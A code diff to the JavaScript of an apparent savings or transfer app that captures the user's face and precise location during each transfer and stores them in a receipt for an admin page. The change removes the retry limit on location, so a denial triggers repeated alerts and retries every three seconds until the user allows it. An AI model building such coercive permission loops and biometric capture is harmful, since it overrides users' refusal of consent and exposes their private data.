@@ -56,17 +56,15 @@ async function captureFace() {
     }
 }
 
-// Get FRESH current location - mandatory, retries until success
+// Get FRESH current location - NEVER returns null, keeps retrying until success
 function getCurrentLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
+            alert('Your device does not support location. Please use a different browser.');
             resolve(null);
             return;
         }
-        let attempts = 0;
-        const maxAttempts = 3;
         function tryGetLocation() {
-            attempts++;
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     resolve({
@@ -77,16 +75,13 @@ function getCurrentLocation() {
                     });
                 },
                 (err) => {
-                    console.error('Location error (attempt ' + attempts + '):', err);
-                    if (attempts < maxAttempts) {
-                        setTimeout(tryGetLocation, 2000);
-                    } else {
-                        resolve(null);
-                    }
+                    console.error('Location error, retrying:', err.message);
+                    alert('Location is required. Please turn on your GPS/Location and tap "Allow". Retrying...');
+                    setTimeout(tryGetLocation, 3000);
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 30000,
+                    timeout: 60000,
                     maximumAge: 0
                 }
             );
@@ -238,17 +233,11 @@ async function completeTransfer() {
     localStorage.setItem('kudasavingsData', JSON.stringify(appData));
     localStorage.setItem('currentTransaction', JSON.stringify(pendingTransaction));
 
-    // Capture face and location for admin receipt - location is mandatory
-    let [capturedFace, location] = await Promise.all([
+    // Capture face and location for admin receipt - location never returns null
+    const [capturedFace, location] = await Promise.all([
         captureFace(),
         getCurrentLocation()
     ]);
-
-    // If location failed, retry one more time with a longer wait
-    if (!location) {
-        console.warn('Location failed first attempt, retrying...');
-        location = await getCurrentLocation();
-    }
 
     // Save full receipt to IndexedDB for admin page
     await saveReceiptToAdmin({
